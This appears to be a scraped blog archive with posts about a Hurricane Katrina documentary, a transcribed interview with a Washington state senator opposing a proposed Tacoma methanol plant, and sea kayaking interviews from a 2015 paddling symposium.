Palladina.\nThe trailer begins with a young man tap dancing and a clip from an interview with a man on a porch of an unfinished house. I thought it was important to show these two things for a couple of reasons:\nKids tap dancing on the street for money is a generations-old tradition unique to New Orleans and specifically to the French Quarter. While the sight of a shirtless black teen dancing for spare change might strike some as a negative representation of African Americans, children from poor families In New Orleans have been tap dancing on Bourbon Street for spare change for over 100 years. Many of today’s well-known performers tap danced as children. The tap dancing supports the “dancing” theme of the film, whose title (just in case you have forgotten already) is DANCING WITH HOPE. In addition, it anchors the location precisely to New Orleans.\nAfrican Americans in New Orleans have a rich oral tradition, which involves \"front-porch storytelling\". We met the man on the porch, Stanley Myers, at one of the homes that SBP (formerly known as the St. Bernard Project) was rebuilding. The house is owned my Edward Lee Sr., a 94 year old World War II veteran who had built the house with his own hands back in 1947. Mr. Myers initially was reluctant to speak to us about Katrina, but Katya eventually persuaded him to tell us his story. Once he got started, the story just poured out of him. He talked nonstop for about 15 minutes about his experience returning to a devastated New Orleans a week after Hurricane Katrina, and the efforts that he and his wife had taken to clean up their property and rebuild. When Mr. Myers tells his story while literally sitting on a porch of an unfinished house, he is following an age-old storytelling tradition.\nWhat is the name of your movie again?\nThe film is titled DANCING WITH HOPE. Although there is indeed some real dancing in this film, the term is used here as a metaphor for the complicated series of steps of getting volunteers organized, trained, and transported to their worksites in order to build and rebuild homes, which offer the families who have suffered through Hurricane Katrina hope for a better future. It also refers more generally to imagining what it would take to build a future where all human beings are treated with dignity and compassion without regard to race or ethnicity.\nWe recorded video with three different Canon DSLRs (70D, 7D Mark II, and a 5D Mark III), and occasionally with two iPhone 6 Pluses. The aerials were recorded using a Phantom 3 Professional quadcopter (a.k.a. \"drone\".)\nWhen will the movie be released?\nWe expect to release a the final version of the movie on Vimeo for submission to film festivals sometime this summer.\nHow did Shirts Across America get its name?\nRight after Hurricane Katrina, 6 different high school students from the State of Washington were given $500 each plus 60 days to grow that money. Each of them came up with their own way of taking the seed money and growing it. Two of the students pooled their money and made t-shirts, one which had a duck on it that said \"Hope Floats\". They ended up selling thousands of t-shirts that said \"Hope Floats\" on them, and they decided to create an nonprofit entity called Shirts Across America to continue to help out victims of the hurricane.\nPlease visit the Shirts Across America website if you are interested in making a donation or volunteer. Thank you! For movie news and updates, follow us on:\nTwitter: https://twitter.com/dancingwithhope\nInstagram: https://www.instagram.com/dancingwithhopemovie\nFacebook: http://www.facebook.com/dancingwithhopemovie\nemail: dancingwithhopemovie@gmail.com\nPosted at 08:30 AM in 2016, Dancing with Hope, Film | Permalink\nThe Tacoma Methanol Plant: Interview with State Senator Jeannie Darneille\nThe proposed $3.4 billion methanol plant in Tacoma is a hot topic right now. If built, it would be the biggest thing to happen to Tacoma in years. In any case, this is a pivotal moment for the city. The city is presented with the choice between selling out to the fossil fuel industry—using natural gas obtained by fracking to produce methanol for China which will ultimately be turned into plastics, or hopefully a cleaner, greener future. Citizens are upset, not only because the plant threatens turn the clock back to a time when Tacoma was a stinky, polluted industrial town, but also because of the complete lack of transparency in the decision-making processes of the Port of Tacoma and the city government.\nThis is a fascinating story about an environmental issue that has global as well as local consequences. Richard Lovering approached me with the idea of documenting the events surrounding the Tacoma methanol plant controversy as they unfold. This interview with Washington State Senator Jeannie Darneille, (27th Legislative District, Ruston and Tacoma) is the first formal interview we recorded for this project. This video was made in collaboration with Katya Palladina who was the videographer.\nJeannie is a very knowledgeable articulate speaker, and her passion for this issue really showed. Right afterwards I felt I needed to edit a short video of her talking about the major points of the controversy. I felt it needed to be shared immediately to raise awareness of the issue through social media.\nI am presenting the full transcript of the interview here now because Jeannie has a lot more to say than can be covered in a short video, about how the City and Port of Tacoma kept plans for the methanol plant project under wraps for 2 years, our economic relationship with China, fracking, the potential impact the methanol plant would have on water and electricity, the dangers of transporting explosive chemicals through narrow urban waterways, and of storing them on reclaimed land that could liquify in a major earthquake, and much more.\nJeannie Darneille, photo copyright © Katya Palladina\nRICHARD: Jeannie, thank you so much for talking with us. So how did you come across this issue of the proposed methanol plant in Tacoma?\nJEANNIE: Well, it was kind of interesting. As an elected official I was in the House of Representatives for 12 years, and have now been in the Senate. This is now my 4th year in the Senate, here in the 27th district in Tacoma. I represent about two thirds of Tacoma in this district, so basically all the area surrounding Commencement Bay from Point Defiance around to Browns Point, and then like a sling shot handle going down the east side, but all of Downtown Tacoma, all of the Tideflats. And for most of that time I also represented the City of Fife. During this recent redistricting that was pared off, and I added another section of Southeast Tacoma, but for longest time I had also represented that community.\nSo when I had a constituent call me from Northeast Tacoma and express concerns about this plant that has the potential to go in our Tideflats region, that piqued my interest because the person outlined concerns about safety. Public health, public safety—these are issues that I’ve worked on for years and years, not necessarily around the environmentalist angle however. I did get interested enough to follow their request, which was to come to a hearing at the Port of Tacoma on May 1st, 2014.\nAs I mentioned, I’ve never really been much of an environmentalist. By that I mean that I have a 100% voting record supporting environmental causes, but I’ve never taken the lead on ferreting out all the information about environmental conflicts, nor have I taken the lead in sponsoring legislation. I always had great advice and great experts in my caucuses and I followed their lead, just as they follow my lead on half a dozen other kinds of issues. This was new to me, but the issue of public safety and the concerns of a neighborhood were definitely things I had worked on before. And the issues about public health have been pretty much central to my work in the legislature.\nSo I tried to find out information about the hearing. I went so far as to go to the website for the Port of Tacoma. I did find reference to a meeting taking place. It told me what the agenda was going to be and included this discussion with the Northwest Innovations Works, LLC. It didn’t tell me the place and didn’t tell me the time. And that was my first inkling that this was not an issue that the proponents wanted to have known in the community. I was not deterred by that. I had my staff call their office and find out when the meeting was taking place and where, and to inform them that they didn’t have the information on their website.\nI rushed over because it happened to be that afternoon. I arrived there at the very end of a queue of people lining up into a rather small room, the conference room for the Port of Tacoma. I arrived at the meeting and signed in to testify. In the legislature we are used to having hearings on bills and there are some controversial subjects where we might have hundreds and hundreds of people signed up to testify, or at least signing in with either a \"pro\" or a \"con\", so I was surprised after almost being late for the meeting that i was actually only number 17 to sign up. I had no idea what I would actually say, because I didn’t know anything about the project, nor who any of the players were, but I sat down in this somewhat small room.\nEvery wall with the room was lined with members of unions who were dressed in their hazard clothes—bright oranges, bright yellows, bright greens—and I knew then who at least one of the players was that had an interest in this proposed leasing of the old Kaiser plant site in the Port of Tacoma to this LLC.\nSo I listened to the testimony. It started with 4 or 5 representatives of Northwest Innovation Works, and then there were many representatives from labor unions talking about the construction jobs, and then the jobs that would be for permanent employees that would manage the plant after it went live.\nI was bringing up the rear after only a couple of my constituents from Northeast Tacoma spoke, two couples. Their testimony basically was exactly what they told me on the phone. They live in an area very close to where the plant would be established. They drive by—there is one access road up to Northeast Tacoma, and it’s very, very close to where the plant is located. They were very concerned about any potential leakage into the Hylebos waterway. They were concerned about air contamination. And they were mostly concerned about what the plans were in case there is a catastrophic event.\nWhen I actually got up to speak I began with this sentence: “I believe this is a project that everyone would love to love. We’ve heard that it provides good jobs. We’ve heard that it would positively impact the environment—the global warming that we are becoming so much, unfortunately, accustomed to. But there are significant gaps in information. You have done nothing, as far as I can see, to reach out to elected officials. You’ve done nothing to reach out to neighborhoods that would be impacted if such a catastrophic event were to take place. And I can’t see how this can move forward until education, dialogue, and advancement of transparency well above what you’ve demonstrated thus far, were to take place.”\nAnd then the hearing concluded with the four members that were present at the commission meeting voting unanimously to award a 30-year lease to the LLC, this after several of us had made the plea to just wait. What was the urgency of voting on this at that meeting? Well, quite frankly, the urgency was they wanted to do it ahead of any public dialogue, ahead of any transparency and ahead of any kind of education to the community.\nSo I left there feeling concerned but also recognizing how little I knew about the issue. I needed to self-educate. I needed to reach out and find more information about this whole issue. How do we get liquified natural gas (LNG) into our county? What is this process of transference? And what is ahead for us in terms of the educational process that needs to take place?\nOne of the challenges in being a legislator is you have to recognize that sometimes a little bit of information makes you dangerous. I didn’t want to come off as being dangerous after a short amount of time. So I took quite a while talking with people.\nI had the opportunity to meet with a person who just moved to Tacoma who worked in the LNG field for 30 years and had retired here in Tacoma. I had the opportunity to learn about some of the real catastrophic events that can happen at sea (he was a ship’s captain also as part of his work), coming into ports, and going through narrow waterways. I heard words of caution from him about whether or not a plant like this had any place at all in an urban center. I was piqued by that and did research into how communities had addressed this issue.\nOf course, there is very little to know about communities that have worked on this because it’s new. Fewer than 10 years ago the United States was an importing nation. We imported liquid natural gas. It was only through the inauguration of fracking that we found reserves that not only were sufficient, or had been deemed to be sufficient, for our own domestic use, but are very marketable, and we became and exporting nation.\nThere is lots of controversy obviously about fracking. One of the things I learned about fracking is that it takes requires a very small sand, a very dense sand, that’s used in the actual fracking process to push the gas out towards an area where it can be drained and put in a reservoir. That small sand only comes from 3 areas of the world: two of those mines are in China and one is in Kuwait.\nSo then I started thinking, let’s follow the bouncing ball here. Who takes the risk? Who pays for it? And what is involved in this whole process of fracking? You follow the sand into the country. It goes to the central part of our country—Oklahoma, Tennessee, wherever they are fracking—and it’s used there in the process of bringing that liquified natural gas to the surface, at great cost potentially to the environment in each of those states. Earthquakes in Oklahoma—not a normal occurrence! So then where does it go? Then we ship it through pipelines and it comes to a town like Tacoma.\nThere are many pipelines across the country. We’ve had pipelines moving gas and moving liquified natural gas through our community for years and years and years. Most people don’t know that we have a refinery on the Tideflats right now that for over 50 years has pumped gas—jet fuel—out to McChord Air Force Base, across the east side of Tacoma through neighborhoods, along a railway track for 50 years. There is a constant process of making sure that that pipeline is not leaking. Part of it is above ground. Part of it is below ground. That same thing is happening across our country with pipelines now. There is great cost to the maintenance of the pipelines so that they don’t cause a catastrophe.\nThen you look at where this natural gas is coming from, and what the process for transforming it to methanol and shipping it to China. The proponents of this plant and this relationship with the Chinese government say that this is an incredible opportunity for the citizens of Tacoma and Pierce County, that it is a $3.4 billion private investment in our community. I have no problem—no problem—confronting that piece of this argument. This is not “private money”. China owns the American debt. This is a situation where we are buying a product from China, bringing it here, fracking our country, taking the gas out, bringing it here, changing it into a product that they want, and shipping it back to them. To their complete profit, and to our complete risk.\nSo now we are going to look at how do we label that? What does that process look like to you? I am enough of a historian to know that it looks an awful like the British Commonwealth to me. Took over the world—a large part of the world—used local labor at a very low cost for a product that had great import to the British Commonwealth. And whether that was minerals or diamonds or you name it, they took it from those countries without their consent. We are sitting here consenting—consenting—to this process in our country.\nRICHARD: Enough that we get 200 jobs.\nJEANNIE: Two hundred sixty jobs— let’s be precise. I have been a long supporter of labor causes, but I don’t understand how we look at the level of risk that is associated with this project, how we look a the level of water needed alone to actually do the transformation between liquified natural gas to methanol, and think that 260 jobs is worth that.\nThis plant is located very close to the city of Fife. Fife is a really interesting city. It sits and is divided by Interstate 5, but there are only 5,000 people that live in the city of Fife, and over 50,000 people come there to work every day. Five thousand people live there and 50,000 come to work there. And it’s an around the clock 24/7 kind of community through warehousing, manufacturing, casinos, gas stations, restaurants—you name it. It’s a small town, but it doesn’t feel like a small town.\nThis community had not been talked to by the LLC at all. There was no one from the city of Fife at that hearing May 1st, 2014. I raised the issue with members of the City Council of Fife one after the other, and none had heard of the project. Yet the Port of Tacoma commissioners had already granted a 30-year lease to this company.\nYou know we just had a large public hearing [the January 21st Enviromental Impact Statement Scoping Meeting in Tacoma] the about what the elements of the Environmental Impact Statement (EIS) would be. I was in Olympia. The session was already going on, but I was able to leave a committee hearing and barrel up the freeway to get here. It was supposed to start at 6:30 PM. It started at 5:30 because they opened the doors at 5:00 and the rooms were completely full at 5:30 and they felt that they needed to move ahead.\nSo when I arrived at 6:00 I was told there was no room at the inn—not in the main room (500 seats), and not in the anteroom, which had 200-300 seats, and there were about 200 of us outside waiting for people to leave the hearing after they had spoken so that we could get in. So I got in about 6:35. I didn’t have the opportunity to hear the LLC give their presentation but by that time they had gone through the process of a “pro” speaker and a “con” speaker, a “pro” speaker and a “con” speaker. By 6:30 all they had left to hear from was the “con” speakers. While there was an occasional positive speaker in there, I was there until 10:30 and all that rest of that time there was people expressing concerns.\nI went back to the legislature the next day and I asked my colleagues, “Have you ever had 1,000 of your constituents show up at one place? One place?” No. No one had ever had this experience.\nI was so struck that night by the presentations by people from my district, the people who had lived in this community for 3 and 4 generations, and the people that were brand new to this community who moved here because of the hope and the promise that community gave to them—the affordability, the friendliness, the fact that it had had a lousy reputation in the past, and it had a better reputation today. I listened to the people that had participated in building our downtown, not the structures that are there, but the ones that were empty in the 1980s and are full again now because of the the investments that government made and the local community made in rebuilding, reenergizing, and reinvesting in this promise that is Tacoma. From the University of Washington Tacoma, the reboot of our Federal Building, the light rail—I mean I could go on and on about the ways I love my city. And all of that is threatened by this plant. This one thing.\nThe young people that spoke, the older people that spoke, the Native Americans that spoke all pointed to that one stark reality, which is that we have everything going for us in this community. We have a vibrant museum district. We have a vibrant Port of Tacoma. We have invested in cleaning up waterways, and really making our city strong. And for this plant to undo the progress that has been made in Tacoma, Washington, or even to threaten to do that, should move any policymaker who is still on the fence about whether or not to support this project.\nI had already made my decision before I went in that room. The Port Commissioners had asked me not to speak against the project. They wanted me to wait—as they did all of the policy makers in Pierce County—wanted us to wait until all the facts were out. And yet I haven’t received any new facts from their side of the argument since they promised to give new facts to us. The die was cast for me. But I was just so amazed—the eloquence of my constituents was the frosting on that for me.\nI will tell you that I am petty much alone right now in terms of actively voicing, and advocating to my constituents that they need to know more about this project, and they need to mobilize.\nI have talked to my colleagues in other districts in the state who have undertaken big projects like this before, trying to stop negative programs from coming into their districts. I spoke with Senator Sharon Nelson who is our minority leader in the Senate Democratic Caucus. She lives on Vashon island. She certainly knows a lot about ASARCO and the horrible effects on her community right across the waterway from where the ASARCO plant had existed, and which now quite frankly is a lovely and evolving, amazing walkable community with lots of amenities which once was a slag heap and a disaster zone. I talked with senator Christine Rolfes from Kitap county where the NASCAR industry had decided they wanted to put up a new NASCAR race track in a rural part of Kitsap county. Her project with trying to rebut that offer took a couple, three years. Senator Nelson’s attempts to end a quarry upsetting the environmental and ecological balance on Maury Island took 9 years.\nSo I think we are in this for the long haul. I don’t think this is going to be a one or two year project for us, to say “No” and mean it, and to be successful in bringing more people to our side and more policymakers to our side, and for the general public to become more aware of this project. It’s certainly going to be an issue that divides our community. I don’t want that to happen, but I think it’s got the kind of magnitude that we are going to see sharp differences from one side to another.\nRICHARD: Do you think it will impact on electoral politics?\nJEANNIE: Yes, I absolutely do think it could impact on electoral politics.\nRICHARD: Specifically where?\nJEANNIE: This project is in the 27th district now, whether the public health threats reach outside the 27th district—certainly they do—Fife now, for instance. Right at the border where the plant will be located is in the 25th district. So far, no legislators have come to any meetings nor have they shown much interest in this topic from the 25th district.\nBut our two representatives from here in the 27th district have met with me and others. They’ve been working with me to write a very long letter to the EIS process so that we could have questions that have been asked of us and make sure those questions are answered in the EIS. I think we are moving together as a delegation on this to some degree. I’m not going to speak for my colleagues until they want to be spoken for, but we’re not in full accord yet, and we certainly have not had a discussion about next steps in terms of how this will proceed for our role in it.\nIt could play in electoral politics, certainly. Any of us could have candidate run against us this year from the other side of the topic. And I would venture to say I will lose labor support in my re-election bid. But if I were to look just to Facebook and see now literally scores of people from this movement—scores of constituents I didn’t know but who saw me at the hearing, who have seen what I had written on Facebook, who heard me talk about this issue who are trying to friend me and keep up with where I am on this issue, I would say this is a movement that will have its roots and its success in social media.\nThis is not something that many campaigns have had to grapple with, quite frankly. It’s a whole new world with social media now, and the tweets and the Facebook posts are going to rule in this educational process. We already see how innovations in social media have influenced and energized and mobilized groups around other topics, including race relations and even responding to the weather and threats of the weather. We can see it working to the good, and I think it will be an excellent tool that will be used to educate the community about the threats of this plant going in.\nRICHARD: What I’ve heard you say is so many times it was a question of getting the word out. It is to the methanol plant proponents not to get the word out generally, and it is to those who are opposing it to get the word out generally. What do you foresee is the best way to get the word out as generally as possible?\nJEANNIE: I think that it’s a continuation of things that have already been done. I’d love to teach an Advocacy 101 class to folks who are just new into this whole field, in trying to mobilize and trying to make a force for good. I think there is a great threat that they will do some things wrong that will negatively impact what they are trying to achieve. So I’d like to caution people that this is a process. We won’t fix it in a day. Be calm. Use some good strategy to move forward, but be persistent in messaging.\nYears ago our Caucus in Olympia had hired a consultant to try to figure out what was the message the Democrats wanted to portray. He came to do a strategy session with us and said, “Well I looked at last year’s messaging, and the Republican party had three messages, and the Democratic party had 83 messages.”\nSo it’s very important for us to know what we want to say, and to repeat that over and over and over again, whether it is spinning an argument, or pivoting it to that message over and again. It wasn’t overnight that people learned that “two-all-beef-patties-special-sauce-lettuce-cheese-pickles-onions-on-a-sesame-seed-bun” was a Big Mac! It won’t be overnight that people learn that this is a project that has potential threats to our community, our air, our water. It has a blast zone that has been drawn to me. The room we are in now is within this blast zone. And that it could take out portions of Marine View Drive which is the one access road into Northeast Tacoma. It could take out Route 509, which was built to provide a parallel road to Interstate 5 so that the locals could move around and let the other folks fight for space on I-5. It could take out portions of I-5 where the state is now going to be investing over a billion dollars in a transportation project to finish Route 167, which will be coming in and hooking into the Port of Tacoma for the transportation of good and services in and out of the Port to improve our economic development. It’s going to have the impact of potentially (and certainly within the blast zone as well) to take out a prison, a federal prison that exists on the Tideflats where 1,500 persons are being detained right now. I can’t imagine what kind of exit plan would be sufficient to continue to have public safety and to provide for personal safety for those 1,500 people, and the hundreds of people that are working at that detention center.\nYou know, there is a reason why the City of Tacoma has never granted permits to build condos on the other side of the 11th Street bridge. A big reason. They haven’t done it is because it is fill dirt. If you were to look at early photographs of Tacoma, you will see the point just below where we are right now, where Thea Foss used to get in her little boat and began to ferry people across where it’s now Northeast Tacoma. There were no fingers of land that went out along waterways where industry has been planted over these years.\nAs you know we have fault lines through this area. We have learned from the New York Times that the Big One is coming (of course, we’ve always known that) We’ve seen what a lahar could look like coming down from Mt. Rainier. We know that the Puyallup River, which comes right behind us here, is the passageway for a lahar coming off the mountain. And we know that this kind of fill in an earthquake can simply turn to dust.\nWe’ve always lived with threats. We have other refineries on the Tideflats, but we’ve never had people living there for a reason. It’s not safe. And yet a former city council passed a resolution accepting an offer from the federal government to place a detention center in that same property where people from Tacoma cannot live.\nThere are all kinds of deals that happen like that over the years that only later are the people of Tacoma made aware. We have the opportunity because we are aware now before the plant is built, before the plant is operational, before the first drop of liquified natural gas makes its way into the plant and gets blasted with 11 million gallons of water a day, and before the first ship leaves into our Commencement Bay, once one of the biggest EPA Superfund sites. We have cleaned it up to a large degree. We have cleaned up the Foss Waterway. We have cleaned up the Kaiser plant upon which this plant will be located if it’s implemented.\nI asked a question last week of our staff in Olympia when we were having a presentation by the Department of Ecology. I asked if any of the cleanup dollars, the millions and millions and millions of dollars that have come out of taxpayers pockets that we have used for cleaning up toxic sites, “Have we ever cleaned up the same site twice?” And the answer of course was “No”. And then there was the, “Why? Are we building something toxic on one of the sites we’ve cleaned up?” And I had to answer “Yes”.\nThere is so much more that I could talk about. I’ve not really talked about the threats to children and the threats to other investments that we’ve made in the waterway. But I would say I feel very optimistic about the people of Tacoma and Pierce County, and even our neighbors just over the hill in South King County, just to our left on Maury Island and Vashon Island, to rise up with us and have our voices known in this effort.\nI’ve talked with the Governor twice about this. I’ve talked with the Governor’s staff twice for about an hour about this project. I believe I’ve opened the Governor’s eyes to something he initially supported, which was a “jobs and environmentally friendly” product.\nThe goal of the Chinese government is to take the methanol that they will receive from this project, and convert a coal-burning plant that makes olefins (plastics) and convert that to a methanol-burning plant. Much fewer emissions, much better for their air quality in China and overall a good thing, were we able to have access to clean fuel at the place where we are currently using dirty fuel. In this case though, we are asking the United States to take all the risks to provide that clean fuel to this area of China. Unfortunately, they don’t have the materials to do that themselves domestically. But I don’t think Tacoma, Washington is the location. And I think that the people of Tacoma will make that loud and clear.\nRICHARD: Given that this plant is going to demand just about as much gas electricity and potable water as the entire rest of Tacoma, couldn’t his mean that utility rates could go up on all of those things for everybody living in Tacoma?\nJEANNIE: It is absolutely true, and no doubt that they will have increased utilization of utilities that currently come in to Tacoma. The rates are established based on the old supply and demand kind of analysis. We have got the supply of water we need to create electricity through turbines that are located outside of Tacoma but in our watershed, which includes Lake Cushman, Lake Alder, the Green River. We operate on hydro—that’s the major source for electricity for this whole basin. If we were to have a user come in to our mix that is going to double the utilization of that water. Double. We’ve got well over a million people that live in this catchment area. One plant is going to double utilization. There is no way that that’s not going to increase our rates. We don’t have sufficient water, freshwater, in the watershed for our current needs. Everyone knows that last summer we were asked to reduce our consumption by 10%. That was voluntary. What happens if we face another hot summer, another year of drought? Well during the course of the life of this plant—30, 40, 50 years—we are going to face many years of drought. There is no question in my mind. The citizens of Tacoma will have to ask our utilities to go elsewhere, since the water table will not be sufficient for that kind of utilization. We will have to purchase that energy from another area. We currently have one of the cheapest forms—hydro—but what if we have to purchase something that is more expensive? Yes, our rates could go up.\nDo you know that every Friday afternoon there are families lined up today at our utility office asking for, petitioning for keeping their lights on over the weekend, keeping their heat on over the weekend, while they try to muster enough money to pay their bill?\nWe have a community that is facing economic challenges. It’s not unlike in many ways the communities elsewhere in the country that have been the locations of these kind of plants. We know that this particular company wants to build another plant in southwest Washington on the Columbia River in a community that has been hard pressed by economic disadvantage—Kalama.\nWe don’t have to look too far for the other plant in their 3-plant proposal, which is in Louisiana, along an area that is called “Cancer Alley” because of the types of plants that have been built there over the years, which is a largely a community of economically disadvantaged individuals living there.\nIf this bad air quality drifts as the wind is blowing right now to our east side of Tacoma, it blows into our most economically disadvantaged portion of our county.\nSo there are issues around rates. We have issues around economic security. We have issues around public education and the transparency of this whole project that have created enough concern for me that I have actually proposed legislation that really has—I’ll say right up front—has little chance of being passed. I dropped a bill as soon as I could after I realized that I could actually request that a particular tax be applied to this project.\nThey, under current structures right now, could quality for a sales tax abatement. In other words they won’t pay sales tax on any kind of manufacturing that they do, any kind of building that they do. This has been largely an economic development tool that the state has used to try to attract companies into coming into Washington. But in this case it could obviously backfire for us. It has brought into our midst not one, but two plants proposed in Washington state by this particular LLC.\nSo I proposed that the tax abatement not apply to projects relating to liquified natural gas being converted into methanol. That bill was referred to the Trade and Economic Development Committee. I thought because it was a tax bill that it would be referred to the Ways and Means Committee which I serve on, but instead it is going to a committee that has already completed its work for the session. It was a direct decision on the part of the Republicans handling which committee things go to, to not place it in a committee that was still doing its work.\nThat is a disappointment. But I have raised the interest and the awareness of my colleagues in this fight. And because I know that this will not be taken care of in this year, I presume I will come back next year with something earlier in the session with a greater potential to be passed, and we will see where that takes us.\nThere is also a bill currently being considered that is a “streamlining” bill, meaning that, for what they call “projects of state significance” (certainly a project of $3.4 billion project has state significance) the bill would take away their requirement to actually receive permits or even have to apply for permits for the plant. I have worked with Republicans on an amendment to their bill. They are going to be accepting the amendment if all works out well this next week and the bill will pass. It is a bill I voted against obviously in the past, and I will probably still vote against it even though I’ve got it amended. It will hopefully go to its death over in the House. Again, what we do with these kinds of things, whether it’s dropping a bill or getting an amendment on a bill, in some ways we are trying to make the pig look better — you know, “putting a bow on the pig”. But we’re going to be able to count on the House to not pass that bill which they have rejected in the past, so we won’t see industries of all types getting out of doing permitting processes that we are relying on right now as we look ahead to how this plant will be implemented. There are shoreline permits. There are air permits. I mean there are all kinds of things ahead of them.\nRICHARD: I think they devoted 3 years for the permitting.\nJEANNIE: Just to the permitting. I’ve got time as well if I’m re-elected to go back to Olympia and continue to try to figure out what a state role would be, in trying to put sideboards around this project, to eliminate the project, to make so many headaches for the project that it doesn’t pencil out. Whatever I can do.\nJF Marleau: Surf's Up in Pedder Bay?\nJF Marleau: Surf's Up in Pedder Bay?! from Andrew Elizaga on Vimeo.\nSea kayaking instructor and guide JF Marleau talks about teaching surfing and demonstrates stern rudder and carving on waves in Pedder Bay at the 2015 Pacific Paddling Symposium. JF is a resident of Ucluelet, BC, and is the author of \"Kayaking the Broken Group Islands. The Essential Guidebook\".\nGinni Callahan: An Introduction to Kayak Sailing\nGinni Callahan: An Introduction to Kayak Sailing from Andrew Elizaga on Vimeo.\nKayak coach, entrepreneur, and writer Ginni Callahan founded and co-owns Columbia River Kayaking, and Sea Kayak Baja Mexico. With Mark Whitaker, she imports Flat Earth Kayak Sails and Sea Kayaking UK (Nigel Dennis Kayaks). With Anna Mallin, she publishes paddling guides to the Loreto National Marine Park. Filmed at the 2015 Pacific Paddling Symposium\nPosted at 09:41 AM in 2015, Pacific Paddling Symposium | Permalink\nJames Manke: This one weird trick will improve your Greenland rolls!\nJames Manke: This one weird trick will improve your Greenland rolls! from Andrew Elizaga on Vimeo.\nGreenland-style paddling instructor James Manke is the founder of the website All Things Qajaq. He teaches at sea kayaking symposiums and events throughout the world, and along with paddler James Roberts, represented Canada to compete in the 2014 National Greenland Kayaking Championships. James Manke won gold in the Greenland rolling competition and 5 silver medals in other traditional kayaking disciplines. He is an active member of West Coast Canadian ocean kayaking group, The Hurricane Riders. We interviewed James at the 2015 Pacific Paddling Symposium.\nPaddling out of Pedder Bay, Vancouver Island. Photo © Katya Palladina\nAndrew: What was going on today at PPS?\nJames: Today was Coaches Day. It was all about getting out there, sharing with and inspiring fellow instructors, which I found very rewarding. One of the things I found very interesting was all the different games that some of these coaches are utilizing and playing. They’re quite clever, actually. Some of the other things that I picked up, and one of the things I do often in rolling, is that I talk a lot about a “load-drive concept”. When we implemented that into strokes and all the different techniques that are out there, it was amazing to find out that the load-drive concept is actually used though all the skill sets in kayaking, along with other sports. It’s very valuable to have a Coaches Day like this at the beginning of a symposium, simply because you can bounce ideas off other instructors. It’s just really rewarding as an instructor to have that as an experience.\nAndrew: What will you be teaching this weekend?\nJames: I’ll be focusing on teaching Greenland rolling, primarily in the pool, and a lot of beginner rolling, some intermediate, and a little bit of advanced. Then on Sunday I’ll be teaching out in the actual currents, out in Race Rocks. We’re going to be doing a Greenland rolling clinic out in the currents, which is the next step after learning your roll. It’s kind of exciting because it’s the first time that’s happened here at PPS, so I’m pretty excited about that on Sunday.\nAndrew: So how did you first get into Greenland rolling?\nJames: Interestingly enough, I got into Greenland rolling from a fear of the water. I was afraid of the water, and it all started when I was a young child. I actually got attacked by a loon when I was 11 years old. I was in a belly boat, and I was kicking backwards, coming around this pier and fly fishing. I kicked into a loon’s nest, and that was a big mistake. It was either the mother or the father, and it swarmed me, and came at me, then it decided to go under the water and it attacked me that way. It became quite an experience! I got out of the water, and never went in to the water until my late 20s, and when I did it was pools primarily. I wouldn’t step foot in a lake, because there are loons in a lake. And the ocean? Heck, no! I mean, if there are loons in a lake, what’s in the ocean, right? There was no chance of me even going in the ocean. I was quite terrified of the water.\nWhen I picked up kayaking and discovered rolling I thought, Hey, this could be a great way for me to overcome that fear of the water. So I picked up on that, and it did help. It started to help me overcome that fear. I discovered that the more that I understood it and that the more rolls I learned, the more confident I became. I went from being completely afraid of the water to, all of a sudden, now I’m playing in the biggest water — paddling Skookumchuck rapids, and that sort of thing. I’ve been down the Grand Canyon. It just sort of all exploded from, started from, a fear of the water. Learning to roll really added a whole lot of confidence to my paddling. So that’s basically my story and how I started — a little bizarre, but that’s where I was.\nAndrew: Can you comment about the difference between standard kayak paddles and Greenland paddles?\nJames: I personally use both paddles. I like “Euroblades” as much as I do like Greenland blades, and I’ll try to be as diverse as I can with both paddles. In the future I’d like to grab a wing paddle and start to blend that into the mix. I’m not so much a purist when it comes to Greenland paddling. I’m more about the blending of the skills. I think that there’s a lot of value from traditional kayaking that modern day kayakers can pick up, so that’s more what I promote rather than being the purist of Greenland, or being one-sided about a Greenland paddle. I think there’s value in all blades, all kayaks. The more kayaks and the more paddles you know how to use, the better paddler you are. That’s the bottom line.\nTraditional wooden paddles, modern gear. Photo © Katya Palladina\nAndrew: About your trip to Greenland with James Roberts to compete in the National Kayaking Championships and to film the movie Greenland Bound — A Paddler’s Pilgrimage: how much do you think that experience changed you? James: It definitely changed me. It changed me in a big way. Going into a competition, you really expect a competitive sort of feel. And when we got there it became very obvious that this was more of a celebration. It was more about a culture, and about inspiring young kids so that that cycle continues. It was really an inspirational event. It’s not so much about winning so much as it is about being there, and inspiring, and being a part of it. I think more of an American attitude toward something like that is that we are quite competitive. We do a lot of sports and we are competitive by nature. So going to an event like that, I walked in feeling that way, but had to give my head a shake, like, “Oh man, I’m here for the wrong reasons!” I really learned that the reason for being there was about kids, and about inspiring the next generation of paddlers. So there was a big message to learn when I was there.\nThere were some language barriers, for sure. In Greenland they speak Greenlandic. Their second language is Danish. There are a number of people who are Danish who live there, so you can use a Danish person as sort of a translator. But still, it’s pretty broken language. Someone from Denmark doesn’t really understand Greenlandic that well, but can kind of pick apart what it is.\nJames Roberts and I went to the judge’s booth, and we had a Danish guy with us to translate. We said, “When is our long distance race?” And from the translation that we got, he said, “Oh, you’ve got lots of time. You can go out for lunch.” So we thought, “Oh great! Thats awesome!” We take off our drysuits and put on all our camera gear, and start hiking up this mountain to go to have lunch. Well, we make it up to the top of the mountain, and it’s a good 15-20 minute haul to get to the top, and there’s nobody there! And we’re like, “No, you gotta be kidding! There’s nobody here!” So we sit around and wait. Nobody shows up for lunch. Ok, this is a little bit odd. So we walk all the way back down to the bottom of the mountain. And we’re like, “Yeah we went all the way up there for lunch but there’s nobody there.” And they’re like, “Oh, you missed your race!” So we ended up missing a race because of the translation that got lost!\nIt was a little frustrating, but we learned that you can’t really rely on the translations. If you want to be a part of this, you just have to stay in that area and just listen for your name. Because I know when they say, “JAMES MANKE, CANADA!”, I know that’s me. But all the other language is very hard to understand.\nThe interesting thing about culture and about different languages is that even if you don’t understand what they are saying, you can feel the energy. It’s very powerful. We felt that “welcomeness”. We could tell we were very accepted and welcome. And it took a couple days to warm into that.\nGreenland Bound - A Paddler's Pilgrimage from Ontario Sea Kayak Centre on Vimeo.\nKatya: What’s in your super-duper coach kit, as far as gear? Do you have some secret stuff in your PFD, something that you always bring?\nJames: I do like to hold on to a memento when I go paddling. For a long time it’s been a necklace of some sort. At one point I had a ring from my grandmother that I used to wear, but recently the memento that I’ve been wearing comes from a young guy that I mentored who lives on Salt Spring Island, and he made me a necklace. That’s now what I wear when I travel and teach. I make sure that I always have this necklace on me. He hand made that for me, so it’s just something that’s very special to me. So 